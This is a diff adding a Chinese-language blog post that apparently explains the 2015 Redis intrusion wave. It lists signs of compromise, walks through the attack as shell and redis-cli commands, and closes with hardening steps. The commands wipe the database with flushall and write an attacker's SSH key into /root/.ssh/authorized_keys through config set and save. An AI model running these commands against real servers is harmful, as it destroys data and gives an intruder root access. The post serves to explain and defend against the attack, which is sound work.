@@ -1,0 +1,80 @@
+import Layout from 'lib/components/layout'
+import {} from '@zeit-ui/react'
+
+export const meta = {
+  title: 'Redis入侵模拟与防范',
+  date: '2015-11-11 20:34:00',
+  description: '',
+  image: '',
+}
+
+
+对最近挺火的Redis入侵事件做了下简单的测试 其实并不算redis的漏洞 被入侵只能说安全意识不够,入侵手段技术含量也不高
+
+
+入侵前提
+----
+
+redis端口6379对外开放，并且没有验证，(以root权限启动,将直接获得root权限)
+
+入侵现象
+----
+
+*   Redis 可能被执行过 flushall 命令
+*   Redis 内建了名为 crackit 的 key ![1](https://wlimg.oss-cn-beijing.aliyuncs.com/img/redis/1.jpg)
+*   /root/.ssh/authorized_keys 被覆盖或者包含 Redis 相关的内容 ![2](https://wlimg.oss-cn-beijing.aliyuncs.com/img/redis/2.png) ![3](https://wlimg.oss-cn-beijing.aliyuncs.com/img/redis/3.jpg)
+
+入侵模拟：
+-----
+
+### 1
+
+    ssh-keygen -t rsa -C "crack@redis.io"
+    
+
+### 2
+
+    (echo -e "\n\n";cat id_rsa.pub;echo -e "\n\n") > foo.txt
+    
+
+### 3
+
+    redis-cli -h xxxx flushall
+    
+
+### 4
+
+    cat foo.txt | redis-cli -h xxxx -x set pwn
+    
+
+### 5,登录到redis
+
+    config set dir /root/.ssh
+    config set dbfilename "authorized_keys"
+    save
+    exit
+    
+
+### 6,ssh登录该机器 入侵成功
+
+入侵防范
+----
+
+### 1，禁止redis端口对外开放
+
+redis.conf文件的 bind 或者在防火墙上做设置
+
+### 2，禁用redis的一些命令（临时）
+
+rename-command xxx
+
+### 3，增加redis验证
+
+redis.conf文件的 requirepass
+
+### 4,以低权限用户启动redis
+
+注意文件权限
+
+
+export default ({ children }) => <Layout meta={meta}>{children}</Layout>
